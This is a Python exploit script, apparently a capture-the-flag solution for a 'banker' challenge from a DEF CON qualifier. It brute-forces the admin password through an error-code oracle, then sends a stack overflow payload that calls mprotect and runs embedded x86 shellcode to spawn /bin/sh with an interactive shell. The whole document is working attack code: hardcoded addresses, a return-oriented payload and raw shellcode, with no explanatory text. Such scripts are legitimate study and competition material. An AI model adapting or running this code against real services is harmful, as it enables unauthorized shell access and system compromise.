import struct,pwnbox
s = lambda x : struct.pack("<I",x)
p = pwnbox.pipe.ProcessPipe("./banker_p")
#p = pwnbox.pipe.SocketPipe("banker_15d6ba5840307520a36aabed33e00841.quals.shallweplayaga.me",9252)
def login_bypass():
  charset = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
  pw = [0] * 8
  k = 0
  end = 0
  while end == 0:
      low = 0
      high = len(charset) - 1
      while low < high:
          mid = (low + high) / 2
          if high - low == 1:
              pw[k] = mid
              k += 1
              break
          pw[k] = mid
          p.read_until("username: ")
          p.write_line("admin")
          p.read_until("password: ")
          pwd = "".join([charset[pw[i]] for i in xrange(len(pw))])
          p.write_line(pwd)
          res = p.read_until("\n")
          if res.find("delayed") > 0:
              res = p.read_until("\n")
          if res.find("code=") > 0:
              err = int(res[res.find("code=") + 5:])
              if err == 1:
                  low = mid
              elif err == -1:
                  high = mid
          else:
              end = 1
              break

def login(idd,pwd):
  p.read_until(":")
  p.write("%s\n"%idd)
  p.read_until(":")
  p.write("%s\n"%pwd)

def crash(name,pwd):
  p.read_until("Console\n")
  p.write("6\n")
  p.read_until("Exit\n")
  p.write("1\n")
  p.read_until(":")
  p.write("%s\n"%name)
  p.read_until(":")
  p.write("%s\n"%pwd)
  p.read_until("Exit\n")
  p.write("4\n")
  



#login("admin","123")
login_bypass()
pay = "A"*(0x42-4)+s(0x08101080)
pay += s(0x0804a6b0)
pay += s(0x8048dd5)
pay += s(0x08102f80)
pay += s(0x08101080)
pay += s(0x01010101)
crash("1",pay)
p.read_until("Console\n")
p.write("5\n")
raw_input()
buf = 0x08101080+0x40
shellcode = "\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80"+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"+"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"+"\x80\xe8\xdc\xff\xff\xff/bin/sh"
shellcode = "\x90"*0x80+shellcode
pay = "A"*4
pay += s(0x8082671)
pay += s(buf)
pay += s(buf)
pay += s(0x08101000)
pay += s(0x1000)
pay += s(0x7)
pay += shellcode
raw_input()
p.write(pay+"\n")
p.interact()

